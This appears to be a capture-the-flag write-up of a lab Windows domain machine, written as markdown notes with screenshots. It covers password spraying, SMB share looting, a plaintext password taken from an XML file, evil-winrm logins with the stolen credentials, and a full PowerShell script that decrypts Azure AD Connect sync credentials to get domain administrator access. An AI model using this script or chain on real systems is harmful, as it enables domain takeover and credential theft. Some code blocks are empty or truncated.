## Password spraying with users list

- One thing to try is to do password spraying and use the users we found as the list for users **AND** passwords. It could work.

```

- We do get a valid pair of creds `MEGABANK.LOCAL\SABatchJobs:SABatchJobs` and a list of the smb shares.

## SMB

- Let's check these shares
- The share azure-uploads is empty  
![azure uploads](../.res/2022-10-16-14-39-53.png)  
- No luck with IPC$, NETLOGON
- We get something with SYSVOL  
![sysvol](../.res/2022-10-16-14-44-24.png)
- And also with users$  
![users](../.res/2022-10-16-14-45-26.png)

### users$

- In mhope folder we have an azure.xml file we can take it for further analysis using `get azure.xml`

#### Azure.xml

- This file contains a password `4n0therD4y@n0th3r$`
- Here is the full file

```xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">

    <TN RefId="0">

      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

## Password spray with the password just found

- Using crackmapexec again we find out that this is mhope password  

![mhope](../.res/2022-10-16-14-55-45.png)

- So we have another pair of credentials `mhope:4n0therD4y@n0th3r$`

## Shell as mhope

- Using evil-winrm, we get a shell as mhope `evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`
- We can get the user shell

## Privesc

- There are a some folders and programs related to Azure. Our user is a member of the Azure Admins group.  

![Azure admins](../.res/2022-10-17-15-41-05.png)

- [This blog](https://blog.xpnsec.com/azuread-connect-for-redteam/) has an interesting script to use Microsoft Azure Active Directory Connect
- I can take the script and upload it using `upload script.ps1` this will fetch the creds from the db ( I hope so :D )
- We had to change the connection String 0xdf explains it on their writeup [here](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

- And it works. We get creds for the administrator `administrator:d0m@in4dminyeah!`  

![Admin creds](../.res/2022-10-17-15-50-52.png)

- Now let's try to connect as Administrator using evil-winrm `evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'`
